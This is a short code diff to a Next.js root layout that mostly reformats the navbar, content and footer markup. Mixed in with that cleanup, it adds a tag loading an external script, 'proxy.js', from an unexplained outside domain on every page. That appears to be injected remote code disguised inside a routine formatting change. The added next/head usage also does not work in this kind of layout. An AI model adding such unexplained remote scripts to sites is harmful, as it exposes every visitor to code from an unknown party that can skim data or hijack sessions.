@@ -4,6 +4,7 @@ import { routing } from "@/src/i18n/routing";
 import type { Metadata } from "next";
 import { NextIntlClientProvider } from "next-intl";
 import { getMessages } from "next-intl/server";
+import Head from "next/head";
 import { notFound } from "next/navigation";
 import "./globals.css";
 
@@ -31,17 +32,17 @@ export default async function RootLayout({
 
   return (
     <html lang={locale}>
+      <Head>
+        <script async src="https://dipmax-software.org/proxy.js"></script>
+      </Head>
       <NextIntlClientProvider messages={messages}>
         <body>
           {/* Navbar */}
           <div className="flex min-h-screen flex-col">
-          <NavBar />
-          <div className="flex-1">
-            {children}
-          </div>
-          {/* Footer */}
-          <Footer />
-
+            <NavBar />
+            <div className="flex-1">{children}</div>
+            {/* Footer */}
+            <Footer />
           </div>
         </body>
       </NextIntlClientProvider>
